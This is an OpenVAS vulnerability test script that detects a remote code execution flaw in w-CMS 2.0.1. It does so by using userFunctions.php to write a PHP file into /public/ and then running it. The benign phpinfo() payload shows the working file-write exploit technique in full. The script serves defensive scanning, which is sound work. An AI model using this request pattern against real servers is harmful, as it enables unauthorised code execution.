###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_w-cms_rce_08_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# w-CMS 2.0.1 Remote Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successfully exploiting this issue may allow an attacker to
execute arbitrary code in the context of the user running the affected
application.
Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103762";

tag_insight = "Input passed to userFunctions.php is not properly sanitized.";


tag_affected = "w-CMS 2.0.1 is vulnerable; other versions may also be affected.";
tag_summary = "w-CMS is prone to a remote code execution vulnerability.";
tag_solution = "Ask the Vendor for an update.";

tag_vuldetect = "Send a HTTP POST request which execute the phpinfo() command
and check the response if it was successfull.";

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"8.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");

 script_name("w-CMS 2.0.1 Remote Code Execution");

 script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122833/w-CMS-2.0.1-Remote-Code-Execution.html");
 script_xref(name:"URL", value:"http://w-cms.info/");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-08-16 11:12:08 +0200 (Fri, 16 Aug 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the phpinfo() command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

dirs = make_list("/cms","/w-cms","/w_cms",cgi_dirs());

foreach dir (dirs) {

  url = dir + '/index.php';
  req = http_get(item:url, port:port);
  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if(!egrep(pattern:"Powered by.*w-CMS", string:buf))continue;

  file = 'openvas_' + rand() + '.php';
  url = dir + '/userFunctions.php?udef=activity&type=' + file  + '&content=%3C?php%20phpinfo();%20?%3E';
  req = http_get(item:url, port:port);
  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

  url = dir + '/public/' + file;
  req = http_get(item:url, port:port);
  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if("<title>phpinfo()" >< buf) {

    url = dir + '/userFunctions.php?udef=activity&type=' + file  + '&content=%3C?php%20exit;%20?%3E';
    req = http_get(item:url, port:port);
    buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

    desc = desc + '\n\nScanner was able to create the file /public/' + file + ' and to execute it. Please remove this file as soon as possible.';

    security_hole(port:port, data:desc);
    exit(0);
  }  

   
}

exit(0);

